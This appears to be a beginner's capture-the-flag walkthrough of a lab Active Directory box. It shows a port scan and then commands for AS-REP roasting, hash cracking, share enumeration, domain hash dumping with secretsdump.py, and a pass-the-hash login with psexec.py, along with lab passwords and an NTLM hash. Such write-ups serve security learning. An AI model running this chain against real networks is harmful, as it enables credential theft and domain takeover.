# Attacktive Directory
<b>Target IP: <code>10.10.87.50</code></b>

 <p>
 	53/tcp   open  domain        Simple DNS Plus <br>
 	80/tcp   open  http          Microsoft IIS httpd 10.0<br>
 	88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-08-10 03:10:15Z)<br>
 	135/tcp  open  msrpc         Microsoft Windows RPC<br>
 	139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn<br>
 	389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)<br>
 	445/tcp  open  microsoft-ds?<br>
 	464/tcp  open  kpasswd5?<br>
 	593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>
 	636/tcp  open  tcpwrapped<br>
 	3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)<br>
 	3269/tcp open  tcpwrapped<br>
 	389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
 </p>
 <p>Let's look at the port 80 <img src="https://i.ibb.co/Qr56rVy/1.png" alt="1" border="0"></p>

<p>
	Using enum4kerb we found interesting users like backup and svc-admin. Using this command: <code>python3 /opt/impacket/examples/GetNPUsers.py -dc-ip 10.10.87.50 spookysec.local/svc-admin -no-pass</code> We got a hash and using <code>john</code> we know that password is <i>management2005</i><br>
	Now let's use smbmap. <br>
	<code>smbmap -H 10.10.87.50 -d spookysec.local -u svc-admin -p management2005</code>
	<p>
		Using smbclient we get the the interesting file from backup directory and find there base64 encoded message. If we decode it we get these creds: <code>backup@spookysec.local:backup2517860</code><br>
		Using this command <code>secretsdump.py -just-dc backup@10.10.87.50</code> and the password we can get all the hashes. <br>
		Then we can use <code>psexec.py</code> to exploit the <i>pass the hash</i> attack and get access to the servers. <code>psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc administrator@10.10.87.5</code>
	</p>
</p>

**I am sorry for such a bad appearance, I am just learning to build articles in markdown**
